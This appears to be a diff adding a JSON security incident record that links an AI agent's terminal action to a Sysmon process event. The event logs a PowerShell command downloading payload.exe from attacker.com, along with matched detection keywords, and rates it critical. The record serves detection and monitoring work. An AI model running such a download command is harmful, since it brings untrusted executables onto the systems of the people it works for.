@@ -1,0 +1,26 @@
+{
+    "incident_id": "INC-0003",
+    "ai_event": {
+        "agent": "Background Script/AI",
+        "action": "terminal",
+        "timestamp": "2026-06-18T16:43:17.3164428Z"
+    },
+    "sysmon_event": {
+        "EventID": 1,
+        "TimestampUTC": "2026-06-18T16:43:17.3164428Z",
+        "ProcessId": "19136",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe  -Command \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe\"",
+        "ParentProcessId": "8664",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "_correlated": true
+    },
+    "severity": "CRITICAL",
+    "matched_rules": [
+        "Suspicious Keyword: invoke-webrequest",
+        "Suspicious Keyword: http",
+        "Suspicious Keyword: payload",
+        "Process: PowerShell",
+        "Network: Outbound Comm"
+    ]
+}
